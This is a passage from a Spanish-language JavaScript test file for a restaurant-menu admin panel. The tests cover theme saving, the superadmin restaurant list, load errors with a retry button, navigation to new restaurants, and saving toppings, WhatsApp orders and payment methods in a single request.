		// Es el caso de casi todo el que había entrado alguna vez: la carga
		// guardaba el tema por defecto.
		assert.equal(temaAlCargar({ antiguo: 'dark', sistemaClaro: true }), 'light');
	});

	test('un «claro» antiguo sí fue una elección, y se respeta', () => {
		assert.equal(temaAlCargar({ antiguo: 'light', sistemaClaro: false }), 'light');
	});

	test('cargar la página no guarda nada; solo el botón guarda', () => {
		const guardados = [];
		const ctx = cargar('index.html', 'function aplicarTema', 'function temaActual', {
			localStorage: { setItem: (k, v) => guardados.push([k, v]) },
			document: { documentElement: { setAttribute() {}, removeAttribute() {} }, querySelectorAll: () => [] },
		});
		ctx.aplicarTema('dark', { guardar: false });
		assert.deepEqual(guardados, []);
		ctx.aplicarTema('light');
		assert.deepEqual(guardados, [['menuAdminTemaElegido', 'light']]);
		assert.match(src, /aplicarTema\(temaActual\(\), \{ guardar: false \}\);/);
	});

	test('el botón de tema está también en el login', () => {
		const login = src.slice(src.indexOf('<div id="loginScreen"'), src.indexOf('<div class="login-box">'));
		assert.match(login, /class="btn-sm btn-tema" onclick="toggleTema\(\)"/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('la lista del superadmin: el rojo solo para eliminar, y el estado no parece un botón', () => {
	// S2 y S3 en docs/revision-ux.md.
	const src = codigoDelPanel();

	function pintarLista(restos) {
		const tarjetas = [];
		const nodo = () => {
			const n = { hijos: [], style: {}, className: '', textContent: '', innerHTML: '', dataset: {},
				appendChild(h) { this.hijos.push(h); return h; } };
			n.querySelector = () => (n._acciones ||= { hijos: [], appendChild(h) { this.hijos.push(h); return h; } });
			return n;
		};
		const lista = { innerHTML: '', appendChild(c) { tarjetas.push(c); } };
		const ctx = cargar('index.html', 'async function cargarListaRestos', '// Encender o apagar la generación con IA', {
			document: {
				getElementById: id => (id === 'adminRestoList' ? lista : { innerHTML: '', appendChild() {}, replaceChildren() {} }),
				createElement: nodo,
			},
			apiFetch: async ruta => null, state: {},
			esc: x => String(x), fichaEntornoHtml: () => '', estadoPagoHtml: () => '', avisoPedidosHtml: () => '',
			fichaPlanHtml: () => '', resumenVideoHtml: () => '', facturacionDe: () => null,
			urlPublica: () => 'https://x', planDe: () => ({}),
			toggleSuspension() {}, entrarARestaurante() {}, cambiarPin() {}, marcarComoPagado() {}, eliminarRestaurante() {},
			// Los filtros de la lista viven en restaurantes-filtros.js y tienen sus propias pruebas.
			pintarFiltrosRestos() {},
			Promise, String,
		});
		// apiFetch devuelve los restaurantes solo en su ruta; el resto, vacío.
		ctx.apiFetch = async (metodo, ruta) => (ruta === '/api/restaurantes' ? restos : ruta === '/api/facturacion' ? [] : {});
		vm.runInContext('apiFetch = globalThis.apiFetch;', ctx);
		return { ctx, tarjetas };
	}

	test('Eliminar es el único rojo; Suspender no lo es', async () => {
		const { ctx, tarjetas } = pintarLista([{ id: 'r1', nombre: 'Bonzas', slug: 'bonzas', activo: true }]);
		await ctx.cargarListaRestos();
		// Desde S6, Suspender y Eliminar van dentro de «⋯ Más»: se buscan en todo el árbol.
		const todos = n => n.hijos.flatMap(h => [h, ...todos(h)]);
		const botones = todos(tarjetas[0]._acciones);
		const por = texto => botones.find(b => b.textContent === texto);
		assert.match(por('Eliminar').className, /\beliminar\b/);
		assert.doesNotMatch(por('Suspender').className, /\b(danger|eliminar)\b/);
		assert.match(por('Suspender').className, /\bsuspender\b/);
	});

	test('el rojo de eliminar se ve sin pasar el ratón, y el de suspender es ámbar', () => {
		assert.match(src, /\.btn-sm\.eliminar\{border-color:var\(--danger\);color:var\(--danger\);\}/);
		assert.match(src, /\.btn-sm\.suspender:hover\{border-color:var\(--warn\);color:var\(--warn\);\}/);
	});

	test('el estado va junto al nombre y fuera de la fila de botones', async () => {
		const { ctx, tarjetas } = pintarLista([
			{ id: 'r1', nombre: 'Bonzas', slug: 'bonzas', activo: true },
			{ id: 'r2', nombre: 'Gale', slug: 'gale', activo: false },
		]);
		await ctx.cargarListaRestos();
		assert.match(tarjetas[0].innerHTML, /<div class="resto-card-name">Bonzas<span class="resto-estado activo">Activo<\/span><\/div>/);
		assert.match(tarjetas[1].innerHTML, /<span class="resto-estado suspendido">Suspendido<\/span>/);
		assert.match(tarjetas[0].innerHTML, /<div class="resto-card-actions"><\/div>/, 'el estado sigue dentro de la fila de botones');
	});

	test('el estado no tiene caja: ni borde ni fondo', () => {
		const regla = src.match(/\.resto-estado\{[^}]*\}/)[0];
		assert.doesNotMatch(regla, /border|background|padding/);
	});

	// S6: siete botones con el mismo peso. A la vista, lo que el usuario dijo usar
	// a diario (15/09/2026); lo de mes en mes, dentro de «⋯ Más».
	test('a la vista quedan Editar menú, Ver carta y Pagó; lo demás, en «⋯ Más»', async () => {
		const { ctx, tarjetas } = pintarLista([{ id: 'r1', nombre: 'Bonzas', slug: 'bonzas', activo: true }]);
		await ctx.cargarListaRestos();
		const fila = tarjetas[0]._acciones.hijos;
		assert.deepEqual(fila.slice(0, 3).map(b => b.textContent), ['Editar menú', 'Ver carta ↗', '✓ Pagó']);
		assert.equal(fila.length, 4, 'tres botones y el menú, nada más suelto');
		const [resumen, menu] = fila[3].hijos;
		assert.equal(fila[3].className, 'resto-mas');
		assert.equal(resumen.textContent, '⋯ Más');
		assert.deepEqual(menu.hijos.map(b => b.textContent), ['Suspender', 'Cambiar PIN', 'Eliminar']);
	});

	test('con plan de video, el interruptor de IA también va en «⋯ Más»', async () => {
		const { ctx, tarjetas } = pintarLista([{ id: 'r1', nombre: 'Indigo', slug: 'indigo', activo: false }]);
		ctx.planDe = () => ({ videos: true });
		await ctx.cargarListaRestos();
		const menu = tarjetas[0]._acciones.hijos[3].hijos[1];
		assert.deepEqual(menu.hijos.map(b => b.textContent), ['Activar', '✨ IA activa', 'Cambiar PIN', 'Eliminar']);
	});

	test('elegir una acción del menú lo cierra', async () => {
		const { ctx, tarjetas } = pintarLista([{ id: 'r1', nombre: 'Bonzas', slug: 'bonzas', activo: true }]);
		await ctx.cargarListaRestos();
		const mas = tarjetas[0]._acciones.hijos[3];
		mas.open = true;
		mas.hijos[1].onclick();
		assert.equal(mas.open, false);
	});

	test('pulsar fuera o Escape cierra los menús, con una sola escucha desde el arranque', () => {
		const escuchas = {};
		const abiertos = [{ open: true }, { open: true }];
		const { vigilarMenusMas } = cargar('index.html', 'function vigilarMenusMas', '// Encender o apagar la generación con IA', {
			document: { addEventListener: (ev, fn) => { escuchas[ev] = fn; }, querySelectorAll: () => abiertos },
		});
		vigilarMenusMas();
		// Pulsar dentro del segundo deja ese abierto y cierra el otro.
		escuchas.click({ target: { closest: () => abiertos[1] } });
		assert.deepEqual(abiertos.map(d => d.open), [false, true]);
		escuchas.keydown({ key: 'Escape' });
		assert.deepEqual(abiertos.map(d => d.open), [false, false]);
		const arranque = src.slice(src.indexOf('// ── ARRANQUE'));
		assert.match(arranque, /vigilarMenusMas\(\);/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('si la lista de restaurantes no carga, se dice por qué y se puede reintentar', () => {
	// S5 en docs/revision-ux.md: «Error cargando restaurantes», sin motivo ni botón.
	const nodo = () => {
		const n = { className: '', textContent: '', type: '', onclick: null, hijos: [], innerHTML: '', style: {}, dataset: {},
			appendChild(h) { this.hijos.push(h); return h; }, replaceChildren() { this.hijos = []; } };
		n.querySelector = () => (n._dentro ||= nodo());
		return n;
	};

	function montar(apiFetch) {
		const lista = nodo();
		const otros = {};
		let reintentos = 0;
		const ctx = cargar('index.html', 'async function cargarListaRestos', '// Encender o apagar la generación con IA', {
			// La lista es un nodo y el desplegable de «clonar» otro: si fueran el
			// mismo, sus opciones se mezclarían con las tarjetas.
			document: { getElementById: id => (id === 'adminRestoList' ? lista : (otros[id] ||= nodo())), createElement: nodo },
			apiFetch, state: {}, Promise, String, TypeError,
			pintarFiltrosRestos() {},
		});
		return { ctx, lista, reintentos: () => reintentos, contar: () => { reintentos++; } };
	}

	test('sin red se dice que no hay conexión, no «Failed to fetch»', async () => {
		const { ctx, lista } = montar(async () => { throw new TypeError('Failed to fetch'); });
		await ctx.cargarListaRestos();
		const caja = lista.hijos[0];
		const motivo = caja.hijos.find(h => h.textContent.includes('conexión'));
		assert.ok(motivo, 'no dice que falta la conexión');
		assert.equal(caja.hijos.some(h => /Failed to fetch/.test(h.textContent)), false);
	});

	test('un error del servidor enseña su mensaje', async () => {
		const { ctx, lista } = montar(async () => { throw new Error('El servidor respondió 502 sin explicación'); });
		await ctx.cargarListaRestos();
		assert.ok(lista.hijos[0].hijos.some(h => /502/.test(h.textContent)));
	});

	test('el botón vuelve a pedir la lista, y si ya funciona la pinta', async () => {
		let falla = true;
		const restos = [{ id: 'r1', nombre: 'Bonzas', slug: 'bonzas', activo: true }];
		const { ctx, lista } = montar(async (m, ruta) => {
			if (falla) throw new TypeError('Failed to fetch');
			return ruta === '/api/restaurantes' ? restos : ruta === '/api/facturacion' ? [] : {};
		});
		Object.assign(ctx, {
			esc: String, fichaEntornoHtml: () => '', estadoPagoHtml: () => '', avisoPedidosHtml: () => '',
			fichaPlanHtml: () => '', resumenVideoHtml: () => '', facturacionDe: () => null, urlPublica: () => '', planDe: () => ({}),
		});
		await ctx.cargarListaRestos();
		const boton = lista.hijos[0].hijos.find(h => h.textContent === 'Reintentar');
		assert.ok(boton, 'no hay botón de reintentar');
		falla = false;
		lista.hijos = [];
		await boton.onclick();
		assert.equal(lista.hijos.length, 1);
		assert.match(lista.hijos[0].innerHTML, /Bonzas/, 'reintentar no volvió a pintar la lista');
	});

	test('el motivo se pinta como texto: puede venir del servidor', () => {
		const src = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');
		const cuerpo = src.match(/function pintarErrorLista\(list, e\) \{[\s\S]*?\n\}/)[0];
		assert.match(cuerpo, /motivo\.textContent = motivoDeError\(e\)/);
		assert.doesNotMatch(cuerpo, /innerHTML\s*=\s*[^'"]*motivo/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('crear un restaurante lleva a él', () => {
	// F4 en docs/revision-ux.md: «✓ Restaurante creado» y el nuevo quedaba el
	// último de la lista, 1.552 px por debajo de lo que se veía.
	function montar(slugs) {
		const tarjetas = slugs.map(slug => {
			const clases = new Set();
			return { dataset: { slug }, vista: 0, clases,
				classList: { add: c => clases.add(c), remove: c => clases.delete(c) },
				scrollIntoView() { this.vista++; } };
		});
		const avisos = [], entradas = [], temporizadores = [];
		const ctx = cargar('index.html', '// F4 en docs/revision-ux.md', 'function cambiarPin', {
			document: { querySelectorAll: sel => (sel === '#adminRestoList .resto-card' ? tarjetas : []) },
			showToast: (msg, tipo, accion) => avisos.push({ msg, tipo, accion }),
			entrarARestaurante: slug => entradas.push(slug),
			setTimeout: fn => temporizadores.push(fn),
		});
		return { ctx, tarjetas, avisos, entradas, temporizadores };
	}

	test('trae a la vista la tarjeta del nuevo y la señala un momento', () => {
		const { ctx, tarjetas, temporizadores } = montar(['bonzas', 'gale', 'zz-nuevo']);
		ctx.llevarARestauranteNuevo('zz-nuevo', 'Nuevo');
		assert.equal(tarjetas[2].vista, 1);
		assert.equal(tarjetas[0].vista, 0);
		assert.ok(tarjetas[2].clases.has('recien-creado'));
		temporizadores.forEach(fn => fn());
		assert.equal(tarjetas[2].clases.has('recien-creado'), false, 'el resaltado no se va solo');
	});

	test('el aviso ofrece montar la carta, y lleva a ese restaurante', () => {
		const { ctx, avisos, entradas } = montar(['zz-nuevo']);
		ctx.llevarARestauranteNuevo('zz-nuevo', 'Pizzería Italiana');
		assert.match(avisos[0].msg, /Pizzería Italiana/);
		assert.equal(avisos[0].accion.texto, 'Montar la carta');
		avisos[0].accion.alPulsar();
		assert.deepEqual(entradas, ['zz-nuevo']);
	});

	test('si la tarjeta no está, el aviso sale igual', () => {
		const { ctx, avisos } = montar([]);
		assert.doesNotThrow(() => ctx.llevarARestauranteNuevo('zz-nuevo', 'Nuevo'));
		assert.equal(avisos.length, 1);
	});

	test('crear la usa después de recargar la lista, y cada tarjeta lleva su slug', () => {
		const src = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');
		const crear = src.match(/async function crearRestaurante\(\) \{[\s\S]*?\n\}/)[0];
		assert.match(crear, /await cargarListaRestos\(\);[\s\S]{0,200}?llevarARestauranteNuevo\(slug, nombre\);/);
		assert.match(src, /card\.className='resto-card'; card\.dataset\.slug=r\.slug;/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('la insignia de pedidos dice lo que la carta tiene, no lo que el plan permite', () => {
	// X1 en docs/revision-ux.md. Todos los planes incluyen carrito, así que salía
	// «🛒 pedidos» en los once restaurantes; Bonzas la llevaba siendo Topnav, sin
	// carrito y sin pestaña Pedidos.
	const ctx = cargar('index.html', [
		['const TODO_INCLUIDO', '// En qué proporción se recorta el video'],
		['function fichaPlanHtml', 'function resumenVideoHtml'],
	], { String, state: { resumenVideo: {} }, esc: String, etiquetaModelo: String });
	const pedidos = atributos => (ctx.fichaPlanHtml({ id: 'r', atributos }).match(/🛒[^<]*/) || [null])[0];

	// Los casos son los de producción el 13/09/2026.
	test('Sidebar con el interruptor puesto: pedidos (aojocerrado y perroscriollos desde sql/24)', () => {
		assert.equal(pedidos({ nav: 'sidebar', plan: 'fotos', carrito: true }), '🛒 pedidos');
	});

	test('Video o Vertical con el interruptor puesto: pedidos (indigo, voro)', () => {
		assert.equal(pedidos({ nav: 'vertical', plan: 'video', carrito: true }), '🛒 pedidos');
	});

	test('Video o Vertical con el interruptor apagado: lo dice apagado (juanmar, pierrot)', () => {
		assert.equal(pedidos({ nav: 'video', plan: 'video', carrito: false }), '🛒 pedidos apagados');
	});

	test('Explorar, desde que tiene interruptor (17/09/2026), dice si está apagado', () => {
		assert.equal(pedidos({ nav: 'explorar', plan: 'completo', carrito: false }), '🛒 pedidos apagados');
		assert.equal(pedidos({ nav: 'explorar', plan: 'completo', carrito: true }), '🛒 pedidos');
	});

	test('Topnav y Sidebar, desde que tienen interruptor, dicen si está apagado (bonzas, malparados)', () => {
		for (const nav of ['topnav', 'sidebar', null])
			assert.equal(pedidos({ nav, plan: 'completo', carrito: false }), '🛒 pedidos apagados', String(nav));
		assert.equal(pedidos({ nav: 'topnav', plan: 'completo', carrito: true }), '🛒 pedidos');
	});
});

describe('cambiar de restaurante empieza arriba', () => {
	// X2: entrando a Bonzas desde la lista se aterrizaba a mitad de su tabla de
	// productos, a la altura que tenía la lista.
	test('entrar y volver llevan la página arriba', () => {
		const llamadas = [];
		const ctx = cargar('index.html', 'function entrarARestaurante', 'function volverAlAdmin', {
			state: {}, sessionStorage: { setItem() {} },
			document: { getElementById: () => ({ style: {} }) },
			window: { scrollTo: (x, y) => llamadas.push([x, y]) }, enterApp() {},
		});
		ctx.entrarARestaurante('bonzas');
		assert.deepEqual(llamadas, [[0, 0]]);
		const src = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');
		const volver = src.match(/function volverAlAdmin\(\) \{[\s\S]*?\n\}/)[0];
		assert.match(volver, /window\.scrollTo\(0, 0\);\s*enterAdmin\(\);/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('los avisos de la dirección del menú no se contradicen', () => {
	// A5 en docs/revision-ux.md: «no responderá hasta que lo registres» y, 8 px
	// debajo, «las dos formas funcionan siempre». Comprobado el 13/09/2026:
	// menu.vmenus.co/bonzas da 200 y bonzas.vmenus.co, sin registrar, 404.
	const src = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');
	const seccion = src.slice(src.indexOf('<div class="section-title">Dirección del menú</div>'), src.indexOf('<div class="section-title">Zona horaria</div>'));
	const visible = seccion.replace(/<!--[\s\S]*?-->/g, '');

	test('ya no afirma que las dos formas funcionen siempre', () => {
		assert.doesNotMatch(visible, /dos formas funcionan siempre/);
		assert.match(visible, /forma de ruta \(menu\.vmenus\.co\/nombre\) responde siempre/);
	});

	test('el aviso del subdominio dice que se compruebe antes del QR', () => {
		assert.match(visible, /comprueba que carga <strong>antes<\/strong> de imprimir el QR/);
	});

	test('la dirección es un enlace que se puede abrir', () => {
		const campos = {};
		const $ = id => (campos[id] ||= { value: 'subdominio', textContent: '', href: '', style: {} });
		const ctx = cargar('index.html', 'function renderUrlPublicaPreview', '// ── ', {
			document: { getElementById: $ },
			state: { restaurante: { slug: 'bonzas' } },
			urlPublica: (r, modo) => (modo === 'subdominio' ? `https://${r.slug}.vmenus.co` : `https://menu.vmenus.co/${r.slug}`),
		});
		ctx.renderUrlPublicaPreview();
		assert.equal($('apUrlPreview').href, 'https://bonzas.vmenus.co');
		assert.equal($('apUrlAviso').style.display, 'block');
		assert.match(seccion, /<a id="apUrlPreview" target="_blank" rel="noopener noreferrer"/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('los toppings se guardan con el botón de Ajustes', () => {
	// 16/09/2026, decidido con el usuario: encender el carrito hacía aparecer dos
	// pestañas que nadie había pedido ni explicado. Los toppings se vinieron a
	// Ajustes con los pedidos, y todo esto escribe en restaurantes.atributos, así
	// que va en una sola petición.
	const src = codigoDelPanel();

	function montar({ atributos = { nav: 'topnav', carrito: true }, plan = { carrito: true },
	                  catalogo = { platino: [{ id: 't1', nombre: 'Queso' }], premium: [], salsas: [] },
	                  huerfanos = [], responde = true } = {}) {
		const campos = {};
		const $ = id => (campos[id] ||= { value: '', checked: false, textContent: '', style: {} });
		$('ajCarrito').checked = !!atributos.carrito;
		const peticiones = [], preguntas = [];
		const ctx = cargar('index.html', [
			['index.html', '// ── ¿LA CARTA TIENE CARRITO DE VERDAD?', '// Mismo criterio que la carta'],
			['ajustes.js', '// ── PINTAR, RECOGER Y GUARDAR', '// ── FILTROS Y ETIQUETAS'],
			['ajustes.js', '// ¿La carta que se está configurando va a tener carrito?', 'function pintarNotaCarrito'],
		], {
			document: { getElementById: $ },
			state: { restaurante: { id: 'r1', atributos }, filtrosDisponibles: [] },
			MODELO_POR_DEFECTO: 'topnav',
			toppingState: catalogo,
			toppingsQueSeQuitan: () => huerfanos,
			preguntar: async o => { preguntas.push([o.texto, ...(o.lista || []), o.nota].join('\n')); return responde; },
			planActual: () => plan, recibePedidos: () => true, puedeElegirCarrito: () => true,
			renderFiltrosCatalogo() {}, pintarNotaCarrito() {}, ajustarPestanasAlModelo() {}, fijarFotoDePestana() {},
			// El marcado de campos vive en index.html; la regla de qué falta sí es
			// la de verdad, porque se carga pedidos.js entero.
			pintarErroresEnCampos() {},
			renderPedidos() {}, renderMetodosPago() {}, renderToppings() {},
			recolectarMetodosPago: () => ({}), metodosIncompletos: () => [],
			// Marcar los campos que faltan vive en index.html; aquí no hay pantalla.
			erroresDeMetodosPago: () => [], pintarErroresEnCampos() {}, CAMPOS_METODOS_PAGO: [],
			apiFetch: async (metodo, ruta, cuerpo) => { peticiones.push(cuerpo); return { id: 'r1', atributos: { ...atributos, ...cuerpo.atributos } }; },
			showToast() {}, Object,
		});
		return { ctx, $, peticiones, preguntas };
	}

	test('ya no hay pestaña Toppings: su marcado está dentro de Ajustes', () => {
		assert.doesNotMatch(src, /id="tabToppings"|id="tabBtnToppings"|saveToppings/);
		const tab = src.slice(src.indexOf('<div id="tabAjustes"'), src.indexOf('<div id="tabQr"'));
		for (const id of ['ajToppingsCuerpo', 'listToppingsPlatino', 'listToppingsPremium', 'listToppingsSalsas', 'toppingsGuia'])
			assert.ok(tab.includes(`id="${id}"`), `falta ${id} en Ajustes`);
		// Y un solo botón de guardar en toda la pestaña.
		assert.equal((tab.match(/class="btn-save"/g) || []).length, 1);
	});

	test('el catálogo viaja con lo demás, en la misma petición', async () => {
		const { ctx, peticiones } = montar();
		await ctx.saveAjustes();
		assert.equal(peticiones.length, 1);
		const at = peticiones[0].atributos;
		assert.equal(JSON.stringify(at.toppings_platino), '[{"id":"t1","nombre":"Queso"}]');
		assert.ok('toppings_premium' in at && 'salsas' in at, 'los tres grupos, o el servidor no sabría cuál vaciar');
		assert.ok('social_bar' in at, 'y sin dejarse lo que ya guardaba');
	});

	test('sin carrito y sin toppings, no viaja ningún grupo', () => {
		// Si no, un restaurante que nunca los ha visto acabaría con tres listas
		// vacías dentro de sus atributos.
		const { ctx } = montar({
			atributos: { nav: 'topnav', carrito: false },
			catalogo: { platino: [], premium: [], salsas: [] },
		});
		const r = ctx.recolectarAjustes();
		assert.ok(!('toppings_platino' in r) && !('salsas' in r));
	});

	test('con el carrito apagado no viajan, y lo guardado se queda como estaba', () => {
		// Escondidos no se mandan: el servidor funde, así que la base conserva
		// los toppings y al encender el carrito vuelven a estar.
		const { ctx } = montar({
			atributos: { nav: 'topnav', carrito: false, salsas: [{ id: 't9', nombre: 'BBQ' }] },
			catalogo: { platino: [], premium: [], salsas: [{ id: 't9', nombre: 'BBQ' }] },
		});
		assert.ok(!('salsas' in ctx.recolectarAjustes()));
	});

	test('borrar un topping que algún plato ofrece pregunta antes de mandarlo', async () => {
		const { ctx, peticiones, preguntas } = montar({ huerfanos: ['Papas: Queso'], responde: false });
		await ctx.saveAjustes();
		assert.equal(peticiones.length, 0, 'decir que no tiene que cortar el guardado entero');
		assert.match(preguntas[0], /Papas: Queso/);
		assert.match(preguntas[0], /cambiarle el nombre a uno, no hace falta borrarlo/);
	});

	test('y si se contesta que sí, se manda', async () => {
		const { ctx, peticiones } = montar({ huerfanos: ['Papas: Queso'], responde: true });
		await ctx.saveAjustes();
		assert.equal(peticiones.length, 1);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('Ajustes guarda también los pedidos, en la misma petición', () => {
	// PE2 en docs/revision-ux.md: eran dos botones, «Guardar» para el número y
	// «Guardar métodos de pago» para lo demás. Desde el 16/09/2026 ni siquiera
	// son pestaña: están en la tarjeta del carrito y los guarda el botón de
	// Ajustes, con las redes y los filtros, en un solo PATCH.
	const src = codigoDelPanel();

	function montar({ whatsapp = '573001234567', nequi = { activo: false, telefono: '', titular: '' },
	                  breb = { activo: false, llave: '' },
	                  carrito = true, plan = { carrito: true }, nav = 'topnav', recibe = true } = {}) {
		const campos = {};
		const $ = id => (campos[id] ||= { value: '', checked: false, textContent: '', style: {} });
		$('pedidosWhatsapp').value = whatsapp;
		$('mpEfectivo').checked = true;
		$('mpNequiActivo').checked = nequi.activo;
		$('mpNequiTelefono').value = nequi.telefono;
		$('mpNequiTitular').value = nequi.titular;
		$('mpBancolombiaTipo').value = 'ahorros';
		$('mpBrebActivo').checked = breb.activo;
		$('mpBrebLlave').value = breb.llave;
		$('ajCarrito').checked = carrito;
		const peticiones = [], avisos = [];
		const ctx = cargar('index.html', [
			['index.html', '// ── ¿LA CARTA TIENE CARRITO DE VERDAD?', '// Mismo criterio que la carta'],
			['ajustes.js', '// ── PINTAR, RECOGER Y GUARDAR', '// ── FILTROS Y ETIQUETAS'],
			['ajustes.js', '// ¿La carta que se está configurando va a tener carrito?', 'function pintarNotaCarrito'],
			['pedidos.js', '// ── PEDIDOS (WhatsApp', null],
		], {
			document: { getElementById: $ },
			state: { restaurante: { id: 'r1', atributos: { nav } }, filtrosDisponibles: [] },
			MODELO_POR_DEFECTO: 'topnav',
			planActual: () => plan, recibePedidos: () => recibe,
			puedeElegirCarrito: () => true,
			renderFiltrosCatalogo() {}, pintarNotaCarrito() {}, ajustarPestanasAlModelo() {}, fijarFotoDePestana() {},
			// El marcado de campos vive en index.html; la regla de qué falta sí es
			// la de verdad, porque se carga pedidos.js entero.
			pintarErroresEnCampos() {},
			// Esta prueba es de pedidos: los toppings de la misma tarjeta no estorban
			// si el restaurante no tiene ninguno, que es lo que dice el catálogo vacío.
			renderToppings() {}, toppingsQueSeQuitan: () => [],
			toppingState: { platino: [], premium: [], salsas: [] },
			apiFetch: async (metodo, ruta, cuerpo) => { peticiones.push({ metodo, ruta, cuerpo }); return { id: 'r1', atributos: { nav, ...cuerpo.atributos } }; },
			showToast: (m, t) => avisos.push({ m, t }), Object,
		});
		return { ctx, $, peticiones, avisos };
	}

	test('ya no hay pestaña Pedidos ni un guardado suyo', () => {
		assert.doesNotMatch(src, /id="tabPedidos"|id="tabBtnPedidos"|savePedidos/);
		// Y el marcado está donde ahora vive: dentro de Ajustes.
		const tab = src.slice(src.indexOf('<div id="tabAjustes"'), src.indexOf('<div id="tabQr"'));
		assert.ok(tab.includes('id="pedidosWhatsapp"') && tab.includes('id="mpNequiActivo"'));
	});

	test('el número y los métodos viajan con lo demás, en una sola petición', async () => {
		const { ctx, peticiones } = montar();
		await ctx.saveAjustes();
		assert.equal(peticiones.length, 1);
		const at = peticiones[0].cuerpo.atributos;
		assert.equal(at.whatsapp_pedidos, '573001234567');
		assert.equal(at.metodos_pago.efectivo.activo, true);
		assert.ok('social_bar' in at && 'filtros_activos' in at, 'y sin dejarse lo que ya guardaba');
	});

	test('un método activo sin datos no deja guardar nada, y dice cuál', async () => {
		const { ctx, $, peticiones, avisos } = montar({ nequi: { activo: true, telefono: '', titular: '' } });
		await ctx.saveAjustes();
		assert.equal(peticiones.length, 0, 'ni siquiera lo que sí estaba bien');
		assert.equal($('ajustesStatus').textContent, 'Faltan datos de Nequi');
		assert.equal(avisos.at(-1).t, 'error');
	});

	test('si falta un solo dato, se dice cuál, no el método', async () => {
		// «Faltan los datos de Nequi» con el titular puesto dejaba adivinando qué
		// campo era. Desde el 17/09/2026 cada campo se marca por su cuenta.
		const { ctx, $ } = montar({ nequi: { activo: true, telefono: '', titular: 'Juan Pérez' } });
		await ctx.saveAjustes();
		assert.match($('ajustesStatus').textContent, /teléfono de Nequi/);
	});

	test('con dos métodos a medias se nombran los dos', async () => {
		const { ctx, $ } = montar({
			nequi: { activo: true, telefono: '', titular: '' },
			breb: { activo: true, llave: '' },
		});
		await ctx.saveAjustes();
		assert.equal($('ajustesStatus').textContent, 'Faltan datos de Nequi y Bre-B');
	});

	test('un método apagado sin datos no estorba', async () => {
		// Apagado no viaja a la carta: exigir sus datos sería impedir guardar por
		// algo que ningún comensal va a ver.
		const { ctx, peticiones } = montar({ nequi: { activo: false, telefono: '', titular: '' } });
		await ctx.saveAjustes();
		assert.equal(peticiones.length, 1);
	});

	test('sin número SÍ se guarda, y se avisa de que falta', async () => {
		// Cambio del 16/09/2026. Antes el número era obligatorio, pero se llegaba
		// a esa pantalla con el carrito ya encendido. Ahora el interruptor está al
		// lado: exigirlo impediría el primer guardado, que es justamente encender
		// el carrito para que aparezca el campo.
		const { ctx, $, peticiones } = montar({ whatsapp: '', recibe: false });
		await ctx.saveAjustes();
		assert.equal(peticiones.length, 1);
		assert.equal(peticiones[0].cuerpo.atributos.whatsapp_pedidos, '');
		assert.match($('ajustesStatus').textContent, /falta el número de WhatsApp/);
		assert.doesNotMatch($('ajustesStatus').textContent, /pestaña/, 'el campo está ahí mismo');
	});

	test('el número se guarda solo con dígitos', async () => {
		const { ctx, peticiones } = montar({ whatsapp: '+57 300 123 4567' });
		await ctx.saveAjustes();
		assert.equal(peticiones[0].cuerpo.atributos.whatsapp_pedidos, '573001234567');
	});

	test('sin carrito no viaja ni el número ni los métodos', async () => {
		// Si no, un restaurante sin pedidos acabaría con un metodos_pago entero
		// de campos vacíos que nunca ha visto.
		const { ctx, peticiones } = montar({ carrito: false });
		await ctx.saveAjustes();
		const at = peticiones[0].cuerpo.atributos;
		assert.ok(!('whatsapp_pedidos' in at) && !('metodos_pago' in at));
	});

	test('cada método incompleto se nombra por el suyo', () => {
		const { ctx } = montar();
		const vacio = { nequi: {}, daviplata: {}, bancolombia: {}, breb: {} };
		assert.equal(ctx.metodosIncompletos(vacio).length, 0);
		assert.equal(JSON.stringify(ctx.metodosIncompletos({ ...vacio, breb: { activo: true, llave: '' } })), '["Bre-B"]');
		assert.equal(JSON.stringify(ctx.metodosIncompletos({ ...vacio, bancolombia: { activo: true, numero_cuenta: '1', titular: '' } })), '["Bancolombia"]');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('el carril de categorías avisa de que hay más, y la rueda no se acelera', () => {
	// P5 en docs/revision-ux.md: 21 categorías y 8 a la vista, sin aviso.
	const src = codigoDelPanel();

	test('el carril difumina su borde como las pestañas', () => {
		assert.match(src, /\.tabs\.hay-mas-derecha,\.cat-filter\.hay-mas-derecha\{/);
		assert.match(src, /\.tabs\.hay-mas-izquierda,\.cat-filter\.hay-mas-izquierda\{/);
	});

	test('marcarBordes sirve para cualquier carril', () => {
		const clases = new Set();
		const carril = { scrollLeft: 0, clientWidth: 862, scrollWidth: 2321,
			classList: { toggle: (c, on) => (on ? clases.add(c) : clases.delete(c)) } };
		const ctx = cargar('index.html', 'function bordesConContenido', 'function marcarBordesDeTabs', {});
		ctx.marcarBordes(carril);
		assert.ok(clases.has('hay-mas-derecha'));
		assert.equal(clases.has('hay-mas-izquierda'), false);
	});

	test('repintar el carril no vuelve a registrar las escuchas', () => {
		// Se repinta al guardar cada plato. Antes cada repintado añadía otra rueda,
		// y el desplazamiento se multiplicaba por el número de guardados.
		const escuchas = {};
		const carril = { dataset: {}, offsetLeft: 0, scrollLeft: 0,
			addEventListener: (ev) => { escuchas[ev] = (escuchas[ev] || 0) + 1; } };
		const ctx = cargar('index.html', 'function initCatFilterDrag', '// ── FUNCIONES SUPERADMIN', {
			document: { getElementById: () => carril },
			window: { addEventListener() {} }, marcarBordes() {},
		});
		for (let i = 0; i < 5; i++) ctx.initCatFilterDrag();
		assert.equal(escuchas.wheel, 1, `la rueda quedó registrada ${escuchas.wheel} veces`);
		assert.equal(escuchas.mousedown, 1);
		assert.equal(escuchas.scroll, 1);
	});

	test('pintar el carril marca sus bordes, y elegir una categoría la trae a la vista', () => {
		const pintar = src.match(/function renderCatFilter\(\) \{[\s\S]*?\n\}/)[0];
		assert.match(pintar, /marcarBordes\(wrap\);/);
		const elegir = src.match(/function setFilter\(catId,btn\) \{[\s\S]*?\n\}/)[0];
